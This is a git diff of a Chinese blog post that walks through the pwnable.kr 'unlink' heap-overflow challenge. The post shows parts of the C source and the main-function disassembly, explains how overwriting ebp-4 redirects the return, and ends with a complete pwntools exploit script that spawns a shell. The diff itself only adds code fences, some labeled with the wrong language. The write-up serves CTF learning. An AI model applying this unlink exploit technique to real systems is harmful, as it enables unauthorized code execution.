@@ -18,6 +18,7 @@ tags:
 
 它直接给出了源代码unlink.c
 
+```python
 	#include <stdio.h>
 	#include <stdlib.h>
 	#include <string.h>
@@ -62,13 +63,14 @@ tags:
 	        return 0;
 	}
 
-
+```
 
 
 可以看出这段代码模仿了堆的一些实现,模拟的 Unlink 堆溢出漏洞。最后打印出A变量栈中地址和heap指向分配的mem地址,让你get shell.
 
 main函数汇编代码如下：
 
+```python
 	.text:0804852F ; int __cdecl main(int argc, const char **argv, const char **envp)
 	.text:0804852F                 public main
 	.text:0804852F main            proc near               ; DATA XREF: _start+17↑o
@@ -154,6 +156,8 @@ main函数汇编代码如下：
 	.text:08048606 ; } // starts at 804852F
 	.text:08048606 main            endp
 
+```
+
 ## 0x01 漏洞分析之折腾
 
 明显程序在 gets(A->buf) 处有堆溢出，一开始我走偏了，狠狠折腾了一番。我的思路是他泄露了&A即栈地址，根据栈地址能算出ret时esp指向的栈顶地址，这个偏移是不会随着系统的aslr变化的。所以我找出了ret 时esp相对于&A的偏移 0x28 。知道了 ret 时的栈顶有什么用呢？ 只要用gets伪造好数据，调用unlink函数的时候就可以替换地址，我要做的就是将 B堆空间的fd替换成ret-4地址，bk替换成shell函数地址，payload如下：
@@ -174,10 +178,13 @@ main函数汇编代码如下：
 
 后来发现main函数结尾那里，
 
+```java
+
 	.text:080485FF                 mov     ecx, [ebp-4]
 	.text:08048602                 leave
 	.text:08048603                 lea     esp, [ecx-4]
 	.text:08048606                 retn
+```
 
 会将**[ecx-4]**写入**esp**，只要我们可控制 **ecx**内容就能控制返回地址。再看上面有**mov  ecx,[ebp-4]** 这样一段代码，只有我们可以控制**[ebp-4]**的内容就能控制**ecx**内容。
 
@@ -187,6 +194,7 @@ main函数汇编代码如下：
 
 ## 0x03 完整exp
 
+```python
 	from pwn import *
 	context(os='linux', log_level='debug')
 	p=process("./unlink")
@@ -203,5 +211,6 @@ main函数汇编代码如下：
 	payload=p32(shell_addr)+"a"*12+p32(heap_addr+12)+p32(stack_addr+16)
 	p.sendline(payload)
 	p.interactive()
+```
 
 >[文件下载](https://github.com/yxshyj/project/tree/master/pwn/pwnable.kr%E4%B9%8Bunlink)
